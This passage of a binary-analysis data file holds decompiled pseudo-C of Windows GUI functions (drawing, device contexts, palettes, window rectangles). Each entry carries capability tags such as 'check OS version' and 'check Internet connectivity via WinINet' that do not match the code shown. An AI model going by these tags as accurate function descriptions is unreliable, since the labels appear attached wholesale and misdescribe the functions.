        "decompiled_code": "\nvoid fcn.0043802c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) == 0) {\n        puStack16 = 0x438045;\n        fcn.0041d880();\n    }\n    else {\n        if (*(in_EAX + 0x5c) == 0) {\n            puStack16 = 0x43805d;\n            iVar1 = fcn.00413ed0();\n            uStack20 = 0x4380b1;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            if (3 < *(iVar1 + 8)) {\n                puStack16 = &stack0xfffffffc;\n                fcn.00437e98();\n            }\n            uVar2 = (**(**(in_EAX + 0x58) + 0x48))();\n            *(in_EAX + 0x5c) = uVar2;\n            fcn.00413a08();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x4380b8;\n            uStack20 = 0x4380b0;\n            fcn.00413f34();\n            return;\n        }\n        puStack16 = 0x4380c6;\n        fcn.0041d884();\n        puStack16 = 0x4380ce;\n        fcn.00438120();\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "004380d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004380d4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) != 0) {\n        fcn.0041d884();\n        fcn.00413ee4();\n        sub.user32.dll_ReleaseDC(*(in_EAX + 0x60), *(in_EAX + 0x5c));\n        *(in_EAX + 0x5c) = 0;\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0043828c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043828c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack48 = &fcn.0043828c::var_1h + 1;\n    var_8h = 0;\n    uStack52 = 0x438359;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_1h._0_1_ = 1;\n    arg_8h = 0x4382c1;\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        arg_8h = 0x4382d3;\n        cVar1 = fcn.00403454();\n        if ((((cVar1 != '\\0') && (*(**0x462098 + 0x7c) != '\\0')) && (*(*(in_EAX + 0x10) + 0x84) != 0)) &&\n           (*param_2 != 0)) {\n            arg_8h = &fcn.0043828c::var_8h;\n            fcn.00448e3c();\n            fcn.00408cb8(arg_8h);\n            fcn.00403ffc();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x438360;\n    iStack56 = 0x438350;\n    fcn.00403fa8();\n    iStack56 = 0x438358;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 474
    },
    "0043862c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0043862c(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041951c();\n    in_EAX[0xf] = in_EAX;\n    in_EAX[0xe] = *(*in_EAX + 0x74);\n    in_EAX[0x14] = *0x4386fc;\n    iVar1 = fcn.0041c71c();\n    in_EAX[0x1a] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4395dc;\n    *(in_EAX + 0x61) = *0x438700;\n    iVar1 = fcn.0043814c();\n    in_EAX[0x1d] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x43a494;\n    in_EAX[0x1c] = -0xfffffb;\n    *(in_EAX + 0x57) = 1;\n    *(in_EAX + 0x16) = 1;\n    *(in_EAX + 0x59) = 1;\n    *(in_EAX + 0x5a) = 1;\n    *(in_EAX + 0x9a) = 1;\n    *(in_EAX + 0x18) = 1;\n    *(in_EAX + 0x5e) = 0;\n    *(in_EAX + 0x7a) = 0xfff4;\n    in_EAX[0x2e] = *0x44fe28;\n    *(in_EAX + 0x54) = 1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 526
    },
    "004387f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004387f8(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_stack_ffffffe8;\n    uint uStack20;\n    \n    uVar2 = 0;\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar1 = fcn.00403454(in_stack_ffffffe8 & 0xffffff00 | param_2);\n        if (iVar1 != 0) {\n            uStack20 = (**(*in_EAX + 0x48))();\n            uVar2 = sub.gdi32.dll_SelectPalette();\n            iVar1 = sub.gdi32.dll_RealizePalette(uStack20);\n            if (iVar1 != 0) {\n                (**(*in_EAX + 0x7c))();\n            }\n            sub.gdi32.dll_SelectPalette(uStack20, uVar2, 0xffffffff);\n            sub.user32.dll_ReleaseDC(uVar2);\n            uVar2 = 1;\n        }\n    }\n    return CONCAT44(uStack20, uVar2);\n}\n",
        "token_count": 253
    },
    "00438968": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00438968(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 8;\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x68))();\n    }\n    fcn.0041997c();\n    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfff7;\n    if (in_EAX[0xc] != 0) {\n        fcn.0043a6d4(0);\n        fcn.0043a6d4(0);\n        fcn.0043a6d4(0);\n        fcn.0043a6d4(0);\n        fcn.0043a6d4(0);\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "00438d30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438d30(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0xa0)) {\n        if ((*(in_EAX + 0xa0) != 0) && (*(*(in_EAX + 0xa0) + 0x178) != 0)) {\n            puStack40 = 0x438d76;\n            fcn.00413ca8();\n        }\n        if (((param_2 != 0) && (param_2 != -1)) && (*(param_2 + 0x178) != 0)) {\n            puStack40 = 0x438d96;\n            fcn.00413a08();\n        }\n    }\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x400;\n    uStack44 = 0x438e2b;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    if (param_2 != -1) {\n        puStack40 = &stack0xfffffffc;\n        fcn.00403454();\n    }\n    iVar1 = *(in_EAX + 0xa0);\n    if (param_2 != iVar1) {\n        if (param_2 == -1) {\n            *(in_EAX + 0xa0) = 0;\n        }\n        else {\n            *(in_EAX + 0xa0) = param_2;\n            if (param_2 != 0) {\n                fcn.00403454();\n            }\n        }\n        if (iVar1 != 0) {\n            fcn.00403454();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfbff;\n    return;\n}\n",
        "token_count": 487
    },
    "00438fb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00438fb4(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x439035;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00405b0c();\n        fcn.0040b574(in_stack_ffffffd4, arg_ch);\n        fcn.004039e4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    (**(**(in_EAX + 0x30) + 0x40))();\n    *param_2 = *param_2 + *(in_EAX + 0x40);\n    param_2[1] = param_2[1] + *(in_EAX + 0x44);\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x43903c;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 393
    },
    "004390cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004390cc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0xa0) != 0) && (*0x463b30 == 0)) && (*0x439134 == (*0x439130 & *(in_EAX + 0x1c)))) {\n        var_8h = arg_8h;\n        fcn.0043a6d4(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00439658": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439658(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x59)) && (*(in_EAX + 0x59) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.0043a6d4(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "004396a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004396a0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x9a)) && (*(in_EAX + 0x9a) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.0043a6d4(0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "004396f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004396f0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x5a)) && (*(in_EAX + 0x5a) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.0043a6d4(0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00439714": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439714(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x60)) && (*(in_EAX + 0x60) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.0043a6d4(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00439840": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00439840(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4398d6;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        uVar2 = 0;\n        fcn.00405b0c();\n        fcn.0040b574(uVar2, arg_ch);\n        fcn.004039e4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    uVar2 = (**(**(in_EAX + 0x30) + 0x48))();\n    sub.gdi32.dll_SetViewportOrgEx(uVar2, *(in_EAX + 0x40), *(in_EAX + 0x44), 0);\n    sub.gdi32.dll_IntersectClipRect(uVar2, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n    *in_FS_OFFSET = uVar2;\n    fcn.00403fa8(0x4398dd);\n    return;\n}\n",
        "token_count": 399
    },
    "004398e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004398e8(int32_t lprcSrc1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint lprcSrc2;\n    uint lprcDst;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    uVar1 = fcn.00413bc0();\n    uVar2 = uVar1;\n    do {\n        do {\n            if (uVar1 < 1) {\n                var_1h._0_1_ = 0;\n                goto code_r0x00439969;\n            }\n            uVar1 = uVar1 - 1;\n            uVar2 = fcn.00413b64();\n        } while ((*(uVar2 + 0x57) == '\\0') || ((*(uVar2 + 0x50) & 0x40) == 0));\n        fcn.00438ecc();\n        sub.user32.dll_IntersectRect(&lprcDst, lprcSrc1 + -0x14, &lprcSrc2);\n        uVar2 = sub.user32.dll_EqualRect(&lprcDst, lprcSrc1 + -0x14);\n    } while (uVar2 == 0);\ncode_r0x00439969:\n    return uVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 337
    },
    "00439974": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00439974(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint var_15h;\n    int32_t var_4h;\n    \n    if (param_2 == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            return;\n        }\n        if ((*(in_EAX + 0x51) & 4) != 0) {\n            return;\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        return;\n    }\n    var_4h = in_EAX;\n    cVar2 = fcn.0044000c();\n    if (cVar2 != '\\0') {\n        fcn.00438ecc();\n        if (((var_15h == '\\0') && ((*(*(var_4h + 0x30) + 0x50) & 0x40) == 0)) &&\n           (cVar2 = fcn.004398e8(&stack0xfffffffc),  cVar2 == '\\0')) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        uVar3 = fcn.0043fd08(&var_15h + 1, -uVar1);\n        sub.user32.dll_InvalidateRect(uVar3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "00439a68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00439a68(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) != '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x51) & 4) == 0)))) &&\n       (in_EAX[0xc] != 0)) {\n        uStack20 = 0x439aad;\n        cVar1 = fcn.0044000c();\n        if (cVar1 != '\\0') {\n            if ((*(in_EAX + 0x14) & 0x40) != 0) {\n                uStack20 = 0x439acd;\n                uStack20 = fcn.0043fd08();\n                puStack24 = 0x439ad3;\n                uVar2 = sub.user32.dll_GetDC();\n                uStack28 = 0x439b41;\n                uStack32 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffe0;\n                uVar3 = uVar2;\n                puStack24 = &stack0xfffffffc;\n                sub.gdi32.dll_IntersectClipRect\n                          (uVar2, in_EAX[0x10], in_EAX[0x11], in_EAX[0x10] + in_EAX[0x12], in_EAX[0x11] + in_EAX[0x13]);\n                fcn.0043db14();\n                *in_FS_OFFSET = uVar3;\n                uVar3 = fcn.0043fd08(uVar2, 0x439b5b);\n                sub.user32.dll_ReleaseDC(uVar3);\n                return;\n            }\n            uStack20 = 0x439b50;\n            (**(*in_EAX + 0x7c))();\n            uStack20 = 0x439b5b;\n            (**(*in_EAX + 0x88))();\n        }\n    }\n    return;\n}\n",
        "token_count": 505
    },
    "00439b64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00439b64(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x462210 + 0xd) != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "00439b94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00439b94(void)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x462210 + 0xd) != '\\0') && (iVar1 = (in_EAX & 0xffffff00 | *(in_EAX + 0x5f)) - 1,  iVar1 < 2)) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "00439c9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439c9c(uchar *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    *arg_8h = 0;\n    if (*(in_EAX + 0xf2) != 0) {\n        *arg_8h = 1;\n        (**(in_EAX + 0xf0))(arg_8h, arg_10h & 0xffffff00 | arg_ch & 0xff, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "00439cd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439cd8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xea) != 0) {\n        (**(in_EAX + 0xe8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00439d24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439d24(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x11a) != 0) {\n        (**(in_EAX + 0x118))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00439e34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439e34(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10a) != 0) {\n        (**(in_EAX + 0x108))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00439e80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00439e80(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint8_t var_ah;\n    uint var_9h;\n    uint uStack9;\n    uint var_1h;\n    \n    var_9h = *arg_8h;\n    uStack9 = arg_8h[1];\n    var_ah = 0;\n    uVar2 = in_EAX;\n    if (*(in_EAX + 0x13a) != 0) {\n        uVar2 = (**(in_EAX + 0x138))(&var_ah, &var_9h);\n    }\n    if (var_ah == 0) {\n        *(in_EAX + 0xa4) = *(in_EAX + 0xa4) + in_ECX;\n        while( true ) {\n            uVar1 = *(in_EAX + 0xa4);\n            uVar2 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f);\n            if (uVar2 < 0x78) break;\n            uVar2 = *(in_EAX + 0xa4) >> 0x1f;\n            iVar3 = ((*(in_EAX + 0xa4) ^ uVar2) - uVar2) + -0x78;\n            *(in_EAX + 0xa4) = iVar3;\n            if (uVar1 < 0) {\n                if (iVar3 != 0) {\n                    *(in_EAX + 0xa4) = -iVar3;\n                }\n                var_ah = fcn.00403454();\n            }\n            else {\n                var_ah = fcn.00403454();\n            }\n        }\n    }\n    return uVar2 & 0xffffff00 | var_ah;\n}\n",
        "token_count": 456
    },
    "00439fdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00439fdc(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uStack52 = 0x439ff1;\n    iVar1 = (**(*param_2 + 0x38))();\n    if (var_1h == '\\0') {\n        var_20h = param_2[0x11];\n        var_1ch = param_2[0x12];\n        var_18h = param_2[0x13];\n        var_14h = param_2[0x14];\n    }\n    else {\n        var_20h = param_2[0x17];\n        var_1ch = param_2[0x18];\n        var_18h = param_2[0x19];\n        var_14h = param_2[0x1a];\n    }\n    uStack52 = 0x43a018;\n    uVar2 = sub.user32.dll_GetDesktopWindow();\n    uStack52 = 0x402;\n    uStack56 = 0;\n    puStack64 = 0x43a02b;\n    uStack60 = uVar2;\n    uVar3 = sub.user32.dll_GetDCEx();\n    uStack68 = 0x43a0f7;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.00439fdc::var_1h + 1;\n    uVar4 = fcn.0041d0f0();\n    uVar5 = sub.gdi32.dll_SelectObject(uVar3, uVar4);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h + iVar1, var_1ch, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_18h - iVar1, var_1ch + iVar1, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_14h - iVar1, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_1ch, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    uVar4 = uVar3;\n    sub.gdi32.dll_SelectObject(uVar3, uVar5);\n    *in_FS_OFFSET = uVar4;\n    sub.user32.dll_ReleaseDC(uVar2, uVar3, 0x43a0fe);\n    return;\n}\n",
        "token_count": 792
    },
    "0043a130": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
